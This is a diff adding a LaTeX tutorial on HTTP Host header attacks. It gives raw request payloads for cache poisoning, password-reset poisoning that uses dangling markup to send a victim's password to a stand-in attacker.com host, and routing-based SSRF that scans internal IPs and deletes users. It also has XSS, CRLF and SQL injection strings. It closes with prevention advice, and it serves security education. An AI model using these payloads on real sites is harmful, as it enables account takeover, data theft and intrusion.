@@ -1,0 +1,1025 @@
+\documentclass[12pt,a4paper]{article}
+\usepackage[utf8]{inputenc}
+\usepackage[T1]{fontenc}
+\usepackage{amsmath}
+\usepackage{amsfonts}
+\usepackage{amssymb}
+\usepackage{graphicx}
+\usepackage{hyperref}
+\usepackage{listings}
+\usepackage{xcolor}
+\usepackage{geometry}
+\usepackage{titlesec}
+\usepackage{fancyhdr}
+\usepackage{enumitem}
+\usepackage{longtable}
+\usepackage{array}
+\usepackage{booktabs}
+\usepackage{tcolorbox}
+\usepackage{parskip}
+\usepackage{verbatim}
+
+% Page Setup
+\geometry{a4paper, margin=1in}
+\setlength{\parskip}{1em}
+\setlength{\parindent}{0pt}
+
+% Color Definitions
+\definecolor{codegreen}{rgb}{0,0.6,0}
+\definecolor{codegray}{rgb}{0.5,0.5,0.5}
+\definecolor{codepurple}{rgb}{0.58,0,0.82}
+\definecolor{backcolour}{rgb}{0.95,0.95,0.92}
+\definecolor{note}{rgb}{0.9,0.95,1}
+\definecolor{warning}{rgb}{1,0.95,0.9}
+\definecolor{danger}{rgb}{1,0.9,0.9}
+\definecolor{success}{rgb}{0.9,1,0.9}
+
+% Code Listing Settings
+\lstdefinestyle{mystyle}{
+    backgroundcolor=\color{backcolour},
+    commentstyle=\color{codegreen},
+    keywordstyle=\color{codepurple}\bfseries,
+    numberstyle=\tiny\color{codegray},
+    stringstyle=\color{codegreen},
+    basicstyle=\ttfamily\footnotesize,
+    breakatwhitespace=false,
+    breaklines=true,
+    captionpos=b,
+    keepspaces=true,
+    numbers=left,
+    numbersep=5pt,
+    showspaces=false,
+    showstringspaces=false,
+    showtabs=false,
+    tabsize=2
+}
+
+\lstset{style=mystyle}
+
+% Custom Commands
+\newtcolorbox{notebox}{colback=note,colframe=blue!50!black,title=\textbf{Note}}
+\newtcolorbox{warningbox}{colback=warning,colframe=orange!50!black,title=\textbf{Warning}}
+\newtcolorbox{tipbox}{colback=success,colframe=green!50!black,title=\textbf{Tip}}
+\newtcolorbox{vulnerablebox}{colback=danger,colframe=red!50!black,title=\textbf{Vulnerable Example}}
+
+\newcommand{\note}[1]{\begin{notebox}#1\end{notebox}}
+\newcommand{\warning}[1]{\begin{warningbox}#1\end{warningbox}}
+\newcommand{\tip}[1]{\begin{tipbox}#1\end{tipbox}}
+\newcommand{\vulnerable}[1]{\begin{vulnerablebox}#1\end{vulnerablebox}}
+
+% Title Formatting
+\titleformat{\section}{\large\bfseries}{\thesection}{1em}{}
+\titleformat{\subsection}{\normalsize\bfseries}{\thesubsection}{1em}{}
+
+% Document Information
+\title{
+    \vspace{2cm}
+    \Huge\textbf{HTTP Host Header Attacks} \\
+    \vspace{1.5cm}
+}
+\author{Eyad Islam El-Taher}
+\date{\today}
+
+\begin{document}
+
+\maketitle
+\tableofcontents
+\newpage
+
+% ============================================================
+% SECTION 1: INTRODUCTION
+% ============================================================
+\section{Introduction to HTTP Host Header}
+
+\subsection{What is the HTTP Host Header?}
+The HTTP \texttt{Host} header is a mandatory request header that specifies the domain name of the server the client wants to communicate with. It was introduced in HTTP/1.1 to support virtual hosting, allowing multiple websites to be hosted on the same IP address.
+
+\begin{lstlisting}[caption=Basic HTTP Host Header Example]
+GET /index.html HTTP/1.1
+Host: example.com
+User-Agent: Mozilla/5.0
+Accept: text/html
+\end{lstlisting}
+
+\subsection{Purpose and Importance}
+The \texttt{Host} header serves several critical functions:
+\begin{itemize}
+    \item \textbf{Virtual Hosting}: Enables multiple domains on one IP address
+    \item \textbf{Routing}: Directs requests to the correct application
+    \item \textbf{URL Generation}: Used to construct absolute URLs in responses
+    \item \textbf{Security}: Helps prevent DNS rebinding attacks
+    \item \textbf{Caching}: Part of cache key for content delivery networks
+\end{itemize}
+
+\subsection{HTTP/1.1 vs HTTP/2 vs HTTP/3}
+\begin{itemize}
+    \item \textbf{HTTP/1.1}: Host header is mandatory; each request includes it
+    \item \textbf{HTTP/2}: Uses \texttt{:authority} pseudo-header instead
+    \item \textbf{HTTP/3}: Similar to HTTP/2 with \texttt{:authority}
+\end{itemize}
+
+% ============================================================
+% SECTION 2: WHY IT EXISTS AND VECTORS
+% ============================================================
+\section{Why HTTP Host Header Exists and Attack Vectors}
+
+\subsection{Technical Reasons for the Host Header}
+
+\begin{itemize}
+    \item \textbf{IP Address Sharing}: 
+        \begin{itemize}
+            \item Multiple websites on a single server
+            \item Cloud hosting environments
+            \item Shared hosting platforms
+        \end{itemize}
+    
+    \item \textbf{Load Balancing}:
+        \begin{itemize}
+            \item Routing to backend servers
+            \item Session persistence
+            \item Geographic distribution
+        \end{itemize}
+    
+\end{itemize}
+
+
+\subsection{Common Attack Vectors}
+
+\begin{longtable}{|p{4.5cm}|p{8cm}|p{4.5cm}|}
+    \hline
+    \textbf{Attack Vector} & \textbf{Description} & \textbf{Impact} \\
+    \hline
+    Host Header Injection & Injecting malicious content via Host header & XSS, cache poisoning \\
+    \hline
+    Host Header Override & Using multiple Host headers & Request routing bypass \\
+    \hline
+    Port Injection & Injecting arbitrary ports & Password reset hijacking \\
+    \hline
+    Domain Reflection & Reflecting Host header in responses & XSS, content spoofing \\
+    \hline
+    Cache Poisoning & Poisoning caches with malicious content & Widespread XSS \\
+    \hline
+    Password Reset Poisoning & Manipulating reset links & Account takeover \\
+    \hline
+    Authentication Bypass & Bypassing access controls & Unauthorized access \\
+    \hline
+    Virtual Host Brute-Forcing & Discovering hidden domains & Increased attack surface \\
+    \hline
+    SQL Injection & Injecting SQL via Host header & Data theft \\
+    \hline
+\end{longtable}
+
+% ============================================================
+% SECTION 3: WHAT ARE HOST HEADER ATTACKS
+% ============================================================
+\section{What Are HTTP Host Header Attacks?}
+
+HTTP Host header attacks are a class of web vulnerabilities where an attacker manipulates the \texttt{Host} header to achieve malicious outcomes. These attacks exploit the trust placed in the \texttt{Host} header by web applications and infrastructure.
+
+\subsection{Definition}
+Host header attacks occur when a web application or server improperly validates, sanitizes, or uses the \texttt{Host} header value, allowing attackers to:
+\begin{itemize}
+    \item Poison web caches
+    \item Hijack password reset functionality
+    \item Bypass security controls
+    \item Perform cross-site scripting (XSS)
+    \item Access internal systems
+    \item Manipulate URL generation
+    \item Steal sensitive information
+    \item Take over user accounts
+\end{itemize}
+
+
+% ============================================================
+% SECTION 4: WHEN IT HAPPENS
+% ============================================================
+\section{When Do Host Header Attacks Happen?}
+
+\subsection{Vulnerable Scenarios}
+
+\subsubsection{1. When Host Header is Trusted for Security Decisions}
+\begin{itemize}
+    \item Access control based on \texttt{Host} header
+    \item Rate limiting per domain
+    \item Authentication decisions
+    \item Admin panel restrictions
+\end{itemize}
+
+\subsubsection{2. When Generating URLs Using Host Header}
+\begin{itemize}
+    \item Password reset emails
+    \item Confirmation links
+    \item Absolute redirects
+    \item Asset loading (JS, CSS)
+    \item API endpoint construction
+\end{itemize}
+
+\subsubsection{3. When Caching Depends on Host Header}
+\begin{itemize}
+    \item CDN configurations
+    \item Reverse proxy caching
+    \item Varnish or Squid setups
+    \item Application-level caching
+\end{itemize}
+
+\subsubsection{4. When Multiple Host Headers are Processed Differently}
+\begin{itemize}
+    \item Frontend proxy takes first header
+    \item Backend application takes last header
+    \item Different systems with different parsing logic
+\end{itemize}
+
+\subsection{ Where to Test for Vulnerabilities}
+
+\begin{longtable}{|p{3.5cm}|p{5cm}|p{5cm}|}
+    \hline
+    \textbf{Component} & \textbf{Test Point} & \textbf{What to Look For} \\
+    \hline
+    Web Application & All endpoints & Reflected header values \\
+    \hline
+    Password Reset & /forgot-password & Links in emails \\
+    \hline
+    Email Systems & Email content & Absolute URLs \\
+    \hline
+    CDN/Proxy & Cacheable responses & Cache behavior \\
+    \hline
+    Admin Panels & /admin, /dashboard & Access bypass \\
+    \hline
+    Asset Loading & JS, CSS, Images & URL construction \\
+    \hline
+    Redirects & 3xx responses & Location headers \\
+    \hline
+\end{longtable}
+
+\subsection{Discovery Techniques}
+
+\tip{%
+\textbf{Quick Discovery Checklist:}
+\begin{itemize}
+    \item Use Burp Suite or similar proxy
+    \item Add \texttt{X-Forwarded-Host} headers
+    \item Try multiple \texttt{Host} headers
+    \item Test with invalid values
+    \item Check all absolute URLs in responses
+    \item Monitor cache headers (\texttt{Age}, \texttt{Cache-Control})
+\end{itemize}
+}
+
+% ============================================================
+% SECTION 6: EFFECTS
+% ============================================================
+\section{Effects of Host Header Attacks}
+
+\subsection{Impact Categories}
+
+\subsubsection{1. Security Impact}
+\begin{itemize}
+    \item \textbf{Account Takeover}: Password reset hijacking
+    \item \textbf{Session Hijacking}: Stealing cookies via XSS
+    \item \textbf{Data Exfiltration}: Dangling markup attacks
+    \item \textbf{Bypass Access Controls}: Admin panel access
+    \item \textbf{SSRF}: Internal system access
+\end{itemize}
+
+\subsubsection{2. Business Impact}
+\begin{itemize}
+    \item \textbf{Reputation Damage}: Trust loss in customers
+    \item \textbf{Legal Liability}: Data breach consequences
+    \item \textbf{Financial Loss}: Theft, fines, remediation costs
+    \item \textbf{Operational Disruption}: Cache poisoning impact
+\end{itemize}
+
+\subsubsection{3. Technical Impact}
+\begin{itemize}
+    \item \textbf{Cache Poisoning}: Malicious content served to all users
+    \item \textbf{XSS}: Client-side code execution
+    \item \textbf{Information Disclosure}: Password exposure
+    \item \textbf{Denial of Service}: Cache flooding
+    \item \textbf{API Abuse}: Unauthorized operations
+    \item \textbf{Virtual Host Discovery}: Hidden domains exposed
+\end{itemize}
+
+% ============================================================
+% SECTION 7: IDENTIFICATION AND TESTING
+% ============================================================
+\section{How to Identify and Test for Host Header Vulnerabilities}
+
+\subsection{Testing Methodology}
+
+\subsubsection{1. Supply Arbitrary Host Header}
+
+\begin{lstlisting}[caption=Basic Host Tests]
+# Test 1: Arbitrary domain
+GET / HTTP/1.1
+Host: arbitrary.com
+
+# Test 2: Different case
+GET / HTTP/1.1
+Host: VULNERABLE.COM
+
+# Test 3: Invalid characters
+GET / HTTP/1.1
+Host: vulnerable.com<script>alert(1)</script>
+
+# Test 4: Port manipulation
+GET / HTTP/1.1
+Host: vulnerable.com:9999
+
+# Test 5: Localhost
+GET / HTTP/1.1
+Host: localhost
+
+# Test 6: IP address
+GET / HTTP/1.1
+Host: 127.0.0.1
+\end{lstlisting}
+
+\subsubsection{2. Check for Flawed Validation}
+
+\begin{lstlisting}[caption=Validation Bypass Tests]
+# Port injection (if domain validated only)
+GET / HTTP/1.1
+Host: vulnerable.com:bad-stuff-here
+
+# Subdomain tricks
+GET / HTTP/1.1
+Host: notvulnerable-website.com
+GET / HTTP/1.1
+Host: hacked-subdomain.vulnerable.com
+
+# DNS suffix matching
+GET / HTTP/1.1
+Host: evil.vulnerable-website.com
+\end{lstlisting}
+
+\subsubsection{3. Multiple Host Headers}
+
+\begin{lstlisting}[caption=Multiple Header Tests]
+# Test 1: Two different hosts
+GET / HTTP/1.1
+Host: vulnerable.com
+Host: attacker.com
+
+# Test 2: Case manipulation
+GET / HTTP/1.1
+Host: vulnerable.com
+HoSt: attacker.com
+
+# Test 3: Duplicate headers
+GET / HTTP/1.1
+Host: vulnerable.com
+Host: vulnerable.com
+
+# Test 4: Three or more
+GET / HTTP/1.1
+Host: first.com
+Host: second.com
+Host: third.com
+\end{lstlisting}
+
+\subsubsection{4. Header Injection Techniques}
+
+\begin{lstlisting}[caption=Injection Tests]
+# XSS injection
+Host: vulnerable.com"><script>alert(1)</script>
+
+# HTML injection
+Host: vulnerable.com'><h1>Hacked</h1>
+
+# Dangling markup
+Host: vulnerable.com:'<a href="//attacker.com/?
+
+# Path traversal
+Host: vulnerable.com/../../etc/passwd
+
+# CRLF injection
+Host: vulnerable.com%0d%0aX-Injected-Header: test
+\end{lstlisting}
+
+\subsubsection{5. Host Override Headers}
+
+\begin{lstlisting}[caption=Host Override Tests]
+# Test various override headers
+GET / HTTP/1.1
+Host: vulnerable.com
+X-Forwarded-Host: attacker.com
+
+GET / HTTP/1.1
+Host: vulnerable.com
+X-Host: attacker.com
+
+GET / HTTP/1.1
+Host: vulnerable.com
+X-Forwarded-Server: attacker.com
+
+GET / HTTP/1.1
+Host: vulnerable.com
+X-HTTP-Host-Override: attacker.com
+
+GET / HTTP/1.1
+Host: vulnerable.com
+Forwarded: host=attacker.com
+\end{lstlisting}
+
+\subsubsection{6. Ambiguous Request Techniques}
+
+\begin{lstlisting}[caption=Ambiguous Request Tests]
+# Absolute URL method
+GET https://vulnerable.com/ HTTP/1.1
+Host: attacker.com
+
+# Line wrapping (indented header)
+GET / HTTP/1.1
+    Host: attacker.com
+Host: vulnerable.com
+
+# Protocol variations
+GET http://vulnerable.com/ HTTP/1.1
+Host: attacker.com
+\end{lstlisting}
+
+
+\subsection{Comprehensive Testing Checklist}
+
+\begin{longtable}{|p{3cm}|p{5cm}|p{5cm}|}
+    \hline
+    \textbf{Test Type} & \textbf{Action} & \textbf{Expected Observation} \\
+    \hline
+    Reflection & Modify Host to domain.com & Domain reflected in response \\
+    \hline
+    Cache & Change cache buster & Cache behavior changes \\
+    \hline
+    Email & Reset password with poison & Poisoned link in email \\
+    \hline
+    Redirect & Observe 3xx responses & Host in Location header \\
+    \hline
+    Assets & Check JS/CSS URLs & Asset URL uses host \\
+    \hline
+    Headers & Add X-Forwarded-Host & Backend accepts override \\
+    \hline
+    Duplicate & Two Host headers & Different processing \\
+    \hline
+    Port & Invalid port number & Port reflected in content \\
+    \hline
+    Absolute URL & GET with full URL & Routing bypass \\
+    \hline
+    Line Wrap & Indented header & Header parsing difference \\
+    \hline
+\end{longtable}
+
+% ============================================================
+% SECTION 8: EXPLOITATION
+% ============================================================
+\section{How to Exploit Host Header Vulnerabilities}
+
+\subsection{Exploitation Techniques}
+
+\subsubsection{1. Cache Poisoning Exploitation}
+
+\begin{lstlisting}[caption=Cache Poisoning Attack]
+# Step 1: Poison the cache
+GET /?cb=123 HTTP/1.1
+Host: vulnerable.com
+Host: attacker.com
+
+# Step 2: Verify poisoning
+GET /?cb=123 HTTP/1.1
+Host: vulnerable.com
+
+# Response should contain:
+# <script src="http://attacker.com/payload.js"></script>
+
+# Step 3: Victim requests
+GET /?cb=123 HTTP/1.1
+Host: vulnerable.com
+
+# Victim receives poisoned response
+# XSS executes in victim's browser
+\end{lstlisting}
+
+\subsubsection{2. Password Reset Poisoning}
+
+\begin{lstlisting}[caption=Password Reset Attack]
+# Step 1: Inject malicious host
+POST /forgot-password HTTP/1.1
+Host: vulnerable.com:'<a href="//attacker.com/?
+username=carlos
+
+# Step 2: Check email client raw view
+# Dangling markup exfiltrates password
+
+# Step 3: Access log shows password
+GET /?/reset%27%3E...password:NewPass123...
+Host: attacker.com
+
+# Step 4: Login with stolen password
+POST /login HTTP/1.1
+Host: vulnerable.com
+username=carlos&password=NewPass123
+\end{lstlisting}
+
+\subsubsection{3. Password Reset Poisoning via Dangling Markup}
+
+\textbf{What is Dangling Markup?}
+Dangling markup is an HTML injection technique where you leave unclosed tags that cause the browser to include subsequent page content as attributes of the injected tag, effectively exfiltrating that content.
+
+\begin{lstlisting}[caption=Dangling Markup Attack Flow]
+# Attack email
+<a href='//vulnerable.com:'<a href="//attacker.com/?/login'>here</a>
+
+# Browser interpretation
+<a href="//attacker.com/?/login%27%3Ehere</a></p>
+<p>Your password: Secret123</p>">
+
+# Resulting GET request
+GET /?/login%27%3Ehere</a></p><p>Your password: Secret123</p>
+Host: attacker.com
+\end{lstlisting}
+
+\textbf{Key Technical Details:}
+\begin{itemize}
+    \item When HTML parser encounters \texttt{<a href="//attacker.com/?}
+    \item Everything after this until the next \texttt{"} becomes the href attribute
+    \item This includes the rest of the email content (including password)
+    \item Browser auto-completes malformed HTML by making a GET request
+    \item No JavaScript execution needed (purely HTML-based)
+    \item Raw HTML view bypasses sanitization (DOMPurify)
+\end{itemize}
+
+\subsubsection{4. Web Cache Poisoning via Ambiguous Requests}
+
+\textbf{What is Ambiguous Request Cache Poisoning?}
+This technique exploits discrepancies in how different components (front-end proxy vs back-end application) process HTTP requests, particularly the Host header.
+
+\textbf{Key Injection Techniques:}
+
+\begin{lstlisting}[caption=Duplicate Host Attack]
+GET / HTTP/1.1
+Host: vulnerable.com          # Front-end uses this for routing
+Host: attacker.com           # Back-end uses this for content
+
+# Result: Cache stores poisoned response
+Response contains: <script src="attacker.com/payload.js"></script>
+# Cache key: Host + Path (uses first host)
+# Content generation: uses second host
+\end{lstlisting}
+
+\begin{lstlisting}[caption=Absolute URL Attack]
+GET https://vulnerable.com/ HTTP/1.1
+Host: attacker.com
+
+# Front-end: Uses request line URL for routing
+# Back-end: Uses Host header for content generation
+\end{lstlisting}
+
+\begin{lstlisting}[caption=Line Wrapping Attack]
+GET / HTTP/1.1
+    Host: attacker.com      # Indented - ignored by some parsers
+Host: vulnerable.com       # Used for routing
+
+# Front-end: Ignores indented header
+# Back-end: Processes indented header as valid
+\end{lstlisting}
+
+\begin{lstlisting}[caption=Port Injection]
+GET / HTTP/1.1
+Host: vulnerable.com:attacker.com
+
+# Validation: Domain name checked (vulnerable.com)
+# Content: Full host including port used
+\end{lstlisting}
+
+\textbf{How Ambiguous Requests Work:}
+\begin{itemize}
+    \item \textbf{Front-end proxy} (load balancer, CDN) processes the request
+    \item \textbf{Back-end application} processes it differently
+    \item This discrepancy allows Host header injection while maintaining valid routing
+\end{itemize}
+
+\textbf{Complete Cache Poisoning Chain:}
+
+\begin{lstlisting}[caption=Step-by-Step Exploitation]
+# Phase 1: Poison the cache with ambiguous request
+GET /?cb=123 HTTP/1.1
+Host: vulnerable.com
+Host: attacker.com
+
+# Response stored in cache with key: /?cb=123
+# Contains poisoned script references
+
+# Phase 2: Verify poisoning
+GET /?cb=123 HTTP/1.1
+Host: vulnerable.com
+
+# Phase 3: Victim requests
+GET /?cb=123 HTTP/1.1
+Host: vulnerable.com
+# Returns poisoned response from cache
+# XSS executes
+\end{lstlisting}
+
+\subsubsection{5. Host Header Override}
+
+\begin{lstlisting}[caption=Host Override Techniques]
+# Technique 1: X-Forwarded-Host
+GET / HTTP/1.1
+Host: vulnerable.com
+X-Forwarded-Host: attacker.com
+
+# Technique 2: X-Host
+GET / HTTP/1.1
+Host: vulnerable.com
+X-Host: attacker.com
+
+# Technique 3: Multiple headers
+GET / HTTP/1.1
+Host: vulnerable.com
+X-Forwarded-Host: attacker.com
+X-Original-Host: attacker.com
+
+# Technique 4: Port overrides
+GET / HTTP/1.1
+Host: vulnerable.com:attacker.com
+\end{lstlisting}
+
+% ============================================================
+% SECTION 8.7: VIRTUAL HOST BRUTE-FORCING
+% ============================================================
+\subsection{Virtual Host Brute-Forcing}
+
+\subsubsection{Overview}
+Companies sometimes host publicly accessible websites and private, internal sites on the same server. Servers typically have both a public and a private IP address. As the internal hostname may resolve to the private IP address, this scenario can't always be detected simply by looking at DNS records.
+
+\begin{lstlisting}[caption=Public vs Private IP Example]
+www.example.com: 12.34.56.78      # Public IP
+intranet.example.com: 10.0.0.132  # Private IP (no public DNS)
+\end{lstlisting}
+
+\subsubsection{Attack Methodology}
+In some cases, the internal site might not even have a public DNS record. Nonetheless, an attacker can typically access any virtual host on any server that they have access to, provided they can guess the hostnames.
+
+\begin{lstlisting}[caption=Virtual Host Brute-Forcing]
+# Brute-force common subdomains
+GET / HTTP/1.1
+Host: admin.internal.vulnerable.com
+
+GET / HTTP/1.1
+Host: intranet.vulnerable.com
+
+GET / HTTP/1.1
+Host: dev.vulnerable.com
+
+GET / HTTP/1.1
+Host: staging.vulnerable.com
+
+GET / HTTP/1.1
+Host: internal.vulnerable.com
+
+# Check response differences:
+# - Different status codes
+# - Different content lengths
+# - Different applications served
+\end{lstlisting}
+
+% ============================================================
+% SECTION 8.8: ROUTING-BASED SSRF
+% ============================================================
+\subsection{Routing-Based SSRF via Host Header}
+
+\subsubsection{What is Routing-Based SSRF?}
+Routing-based SSRF relies on exploiting intermediary components like load balancers and reverse proxies that are prevalent in cloud-based architectures.
+
+\subsubsection{Attack Vector}
+These components sit in a privileged network position, receiving requests from the public web while having access to much of the internal network. If they are insecurely configured to forward requests based on an unvalidated Host header, they can be manipulated into misrouting requests to arbitrary systems.
+
+\subsubsection{Detection Using Burp Collaborator}
+\begin{lstlisting}
+GET https://vulnerable-website.com/ HTTP/1.1
+Host: BURP-COLLABORATOR-SUBDOMAIN
+
+# If you receive a DNS lookup from the target server
+# or another in-path system, this indicates you may be
+# able to route requests to arbitrary domains
+\end{lstlisting}
+
+\subsubsection{Internal Network Scanning}
+Having confirmed manipulation of an intermediary system, the next step is to access internal-only systems:
+
+\begin{lstlisting}[caption=Internal IP Scanning]
+# Scan private IP ranges
+GET https://vulnerable-website.com/ HTTP/1.1
+Host: 192.168.0.1
+
+# CIDR notation examples:
+# 192.168.0.0/16 (192.168.0.0 - 192.168.255.255)
+# 10.0.0.0/8 (10.0.0.0 - 10.255.255.255)
+# 172.16.0.0/12 (172.16.0.0 - 172.31.255.255)
+
+# Common internal services
+Host: 192.168.0.1:8080     # Proxy
+Host: 192.168.0.1:6379     # Redis
+Host: 192.168.0.1:5432     # PostgreSQL
+Host: 192.168.0.1:3306     # MySQL
+Host: 192.168.0.1:22       # SSH
+Host: 192.168.0.1:443      # HTTPS
+Host: 192.168.0.1:5000     # Flask/Docker
+Host: 192.168.0.1:9200     # Elasticsearch
+Host: 192.168.0.1:9090     # Prometheus
+\end{lstlisting}
+
+
+\subsubsection{Exploitation Example}
+\begin{lstlisting}[caption=SSRF to Admin Panel]
+# Step 1: Discover internal IP
+GET https://vulnerable-website.com/ HTTP/1.1
+Host: 192.168.0.1
+
+# Step 2: Access admin panel
+GET https://vulnerable-website.com/admin HTTP/1.1
+Host: 192.168.0.1
+
+# Step 3: Perform admin actions
+POST https://vulnerable-website.com/admin/delete HTTP/1.1
+Host: 192.168.0.1
+Cookie: session=YOUR-SESSION
+Content-Type: application/x-www-form-urlencoded
+
+csrf=TOKEN&username=carlos
+\end{lstlisting}
+
+% ============================================================
+% SECTION 8.9: SSRF VIA ABSOLUTE URL AND FLAWED REQUEST LINE
+% ============================================================
+\subsection{SSRF via Absolute URL and Flawed Request Line}
+
+\subsubsection{Absolute URL SSRF}
+When a server validates the absolute URL in the request line instead of the Host header, you can manipulate the Host header while maintaining access.
+
+\begin{lstlisting}[caption=Absolute URL Attack]
+# Normal request (validated)
+GET / HTTP/1.1
+Host: vulnerable.com
+
+# Absolute URL bypass
+GET https://vulnerable.com/ HTTP/1.1
+Host: 192.168.0.1
+
+# The server validates the absolute URL
+# But routes based on the Host header
+# Allows internal access while maintaining validation
+\end{lstlisting}
+
+\subsubsection{Malformed Request Line SSRF}
+Custom proxies may fail to properly validate the request line, allowing unusual input.
+
+\begin{lstlisting}[caption=Malformed Request Line Attack]
+# Normal request
+GET /path/to/resource HTTP/1.1
+
+# Malformed request with @ symbol
+GET @private-intranet/example HTTP/1.1
+
+# Results in upstream URL:
+# http://backend-server@private-intranet/example
+# Interpreted as: username=backend-server, host=private-intranet
+
+# This can allow access to internal systems
+GET @192.168.0.1/admin HTTP/1.1
+\end{lstlisting}
+
+% ============================================================
+% SECTION 8.10: CONNECTION STATE ATTACKS
+% ============================================================
+\subsection{Connection State Attacks}
+
+\subsubsection{Overview}
+For performance, many websites reuse connections for multiple request/response cycles. Poorly implemented HTTP servers assume certain properties (like Host header) are identical for all requests over the same connection.
+
+\subsubsection{Attack Technique}
+\begin{lstlisting}[caption=Connection State Attack]
+# First request (innocent) - establishes connection
+GET / HTTP/1.1
+Host: vulnerable.com
+Connection: keep-alive
+
+# Second request (malicious) - same connection
+GET /admin HTTP/1.1
+Host: 192.168.0.1
+Connection: keep-alive
+
+# The server validates only the first request
+# Subsequent requests bypass validation
+# This allows access to restricted content
+\end{lstlisting}
+
+\subsubsection{Exploitation Steps}
+\begin{enumerate}
+    \item Send a legitimate request to establish connection
+    \item Add both tabs to a group in Burp Suite
+    \item Change send mode to "Send group in sequence (single connection)"
+    \item Set Connection header to keep-alive
+    \item First request: Valid Host header for validation
+    \item Second request: Malicious Host header for exploitation
+\end{enumerate}
+
+\begin{lstlisting}[caption=Connection State Attack Example]
+# Tab 1: Validation request
+GET / HTTP/1.1
+Host: vulnerable.com
+Connection: keep-alive
+
+# Tab 2: Exploitation request
+POST /admin/delete HTTP/1.1
+Host: 192.168.0.1
+Cookie: session=VICTIM_SESSION
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+
+csrf=TOKEN&username=admin
+\end{lstlisting}
+
+
+\subsubsection{7. SQL Injection via Host Header}
+
+\begin{lstlisting}[caption=SQL Injection Attack]
+# Basic SQL injection
+GET / HTTP/1.1
+Host: vulnerable.com' OR '1'='1
+
+# If Host header used in SQL query:
+SELECT * FROM users WHERE host = 'vulnerable.com' OR '1'='1'
+
+# Blind SQL injection
+GET / HTTP/1.1
+Host: vulnerable.com' AND SLEEP(5)--
+
+# Error-based
+GET / HTTP/1.1
+Host: vulnerable.com' AND 1=CONVERT(int, @@version)--
+
+# Union-based
+GET / HTTP/1.1
+Host: vulnerable.com' UNION SELECT username,password FROM users--
+\end{lstlisting}
+
+\section{Host Header Validation Bypass Techniques}
+
+\subsection{Common Bypass Techniques}
+
+\begin{longtable}{|p{5cm}|p{10cm}|}
+    \hline
+    \textbf{Technique} & \textbf{Example} \\
+    \hline
+    Port Injection & Host: vulnerable.com:malicious \\
+    \hline
+    Subdomain Whitelisting & Host: random.vulnerable.com \\
+    \hline
+    DNS Suffix Matching & Host: notvulnerable-website.com \\
+    \hline
+    Header Override & X-Forwarded-Host: attacker.com \\
+    \hline
+    Duplicate Headers & Host: vulnerable.com \& Host: attacker.com \\
+    \hline
+    Line Wrapping & \quad Host: attacker.com \\
+    \hline
+    Absolute URL & GET https://vulnerable.com/ ... Host: attacker \\
+    \hline
+    Protocol Variation & http:// vs https:// \\
+    \hline
+    Case Manipulation & Host: VULNERABLE.COM \\
+    \hline
+    Null Byte Injection & Host: vulnerable.com\%00attacker.com \\
+    \hline
+\end{longtable}
+
+\subsection{Why Host Header Validation Fails}
+
+\begin{itemize}
+    \item \textbf{Parser Discrepancies}: Different components parse headers differently
+    \item \textbf{Trust in User Input}: Applications trust the Host header
+    \item \textbf{Default Configurations}: Many frameworks support override headers by default
+    \item \textbf{Caching Behavior}: Caches use Host header in cache key
+    \item \textbf{Dynamic URL Generation}: Host header used in link generation
+    \item \textbf{Ambiguous Request Handling}: Front-end vs back-end differences
+\end{itemize}
+
+% ============================================================
+% SECTION 10: PREVENTION
+% ============================================================
+\section{How to Prevent HTTP Host Header Attacks}
+
+\subsection{Best Practices}
+
+\subsubsection{1. Server-Side Validation}
+
+\begin{lstlisting}[caption=Host Validation]
+// Good: Whitelist validation
+const allowedHosts = ['example.com', 'www.example.com'];
+function validateHost(host) {
+    return allowedHosts.includes(host);
+}
+
+// Better: Regular expression validation
+function validateHost(host) {
+    const pattern = /^[a-zA-Z0-9-]+(\.[a-zA-Z0-9-]+)*\.[a-zA-Z]{2,}$/;
+    if (!pattern.test(host)) return false;
+    return allowedHosts.includes(host);
+}
+
+// Best: Framework validation
+// In Node.js with Express
+app.use((req, res, next) => {
+    if (!allowedHosts.includes(req.hostname)) {
+        return res.status(400).send('Invalid Host header');
+    }
+    next();
+});
+\end{lstlisting}
+
+
+
+\subsection{Defense-in-Depth Strategies}
+
+\subsubsection{1. Input Validation}
+\begin{itemize}
+    \item Validate \texttt{Host} header against whitelist
+    \item Reject malformed headers
+    \item Sanitize header before reflection
+    \item Encode output contextually
+    \item Implement proper port validation
+    \item Reject multiple Host headers
+\end{itemize}
+
+
+
+\subsubsection{4. Cache Security}
+
+\begin{lstlisting}[caption=Cache Security]
+# Proper cache headers
+Cache-Control: private, no-store, no-cache, 
+    must-revalidate, max-age=0
+
+# Vary header for cache differentiation
+Vary: Host, Accept-Encoding
+
+# Cache key includes full host
+# Ensure cache isolation per domain
+
+# Prevent cache poisoning
+Cache-Control: no-cache, no-store, must-revalidate
+Pragma: no-cache
+Expires: 0
+\end{lstlisting}
+
+\subsubsection{5. Disable Host Override Headers}
+\begin{lstlisting}[caption=Disable Override Headers]
+# Remove or ignore these headers if not needed
+# X-Forwarded-Host
+# X-Host
+# X-Forwarded-Server
+# X-HTTP-Host-Override
+# Forwarded
+
+# In Nginx - don't forward these headers
+proxy_set_header X-Forwarded-Host "";
+proxy_set_header X-Host "";
+
+# In Apache - strip headers
+RequestHeader unset X-Forwarded-Host
+RequestHeader unset X-Host
+\end{lstlisting}
+
+\subsection{Comprehensive Prevention Checklist}
+
+\begin{itemize}
+    \item \textbf{Validation Layer}:
+        \begin{itemize}
+            \item Whitelist allowed hostnames
+            \item Validate against server name
+            \item Check for multiple Host headers
+            \item Validate port numbers
+            \item Use regex for format validation
+        \end{itemize}
+    
+    \item \textbf{Application Layer}:
+        \begin{itemize}
+            \item Never trust Host header for security
+            \item Use absolute URLs with configured domains
+            \item Sanitize reflected host values
+            \item Implement proper CSP
+            \item Use framework security features
+        \end{itemize}
+    
+    
+    \item \textbf{Monitoring Layer}:
+        \begin{itemize}
+            \item Log Host header anomalies
+            \item Monitor for duplicate headers
+            \item Alert on suspicious patterns
+            \item Regular security testing
+            \item Monitor for cache poisoning attempts
+        \end{itemize}
+\end{itemize}
+
+
+\end{document}
